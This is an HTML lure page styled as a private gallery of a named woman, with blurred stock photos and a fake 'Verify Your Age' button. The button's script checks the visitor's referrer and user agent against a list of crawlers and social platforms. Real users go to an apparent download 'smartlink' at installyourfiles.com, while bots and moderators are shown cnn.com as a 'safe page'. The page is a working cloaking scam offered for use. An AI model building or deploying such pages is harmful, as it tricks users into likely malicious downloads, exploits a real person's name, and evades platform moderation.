<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Natasha Ave - Private Gallery</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #111;
      color: #fff;
    }
    .container {
      max-width: 900px;
      margin: 40px auto;
      padding: 20px;
      text-align: center;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 10px;
    }
    p {
      font-size: 1em;
      margin-bottom: 20px;
      color: #ccc;
    }
    .gallery {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 15px;
    }
    .gallery img {
      width: 100%;
      border-radius: 10px;
      filter: blur(6px);
      transition: 0.3s;
    }
    .gallery img:hover {
      filter: blur(0);
    }
    .btn {
      margin-top: 30px;
      padding: 12px 30px;
      background-color: #ff3366;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1em;
      cursor: pointer;
    }
    .btn:hover {
      background-color: #e6005c;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Natasha Ave's Secret Gallery</h1>
    <p>Preview only. To view full gallery, please verify your age.</p>
    <div class="gallery">
      <img src="https://source.unsplash.com/random/201x300/?girl" alt="Private Photo">
      <img src="https://source.unsplash.com/random/202x300/?model" alt="Private Photo">
      <img src="https://source.unsplash.com/random/203x300/?fashion" alt="Private Photo">
      <img src="https://source.unsplash.com/random/204x300/?posing" alt="Private Photo">
      <img src="https://source.unsplash.com/random/205x300/?woman" alt="Private Photo">
      <img src="https://source.unsplash.com/random/206x300/?lifestyle" alt="Private Photo">
    </div>
    <button class="btn" onclick="goCloak()">Verify Your Age</button>
  </div>  <script>
    function goCloak() {
      const blockList = [
        /facebook|crawler|bot|preview|whatsapp|telegram|slack|discord/i,
        /google|t.co|tiktok|pinterest|reddit/i
      ];
      const ref = document.referrer;
      const ua = navigator.userAgent;
      const suspicious = blockList.some(regex => regex.test(ref) || regex.test(ua));
      if (!suspicious) {
        window.location.href = "https://installyourfiles.com/1820364"; // smartlink kamu
      } else {
        window.location.href = "https://cnn.com"; // halaman aman
      }
    }
  </script></body>
</html>
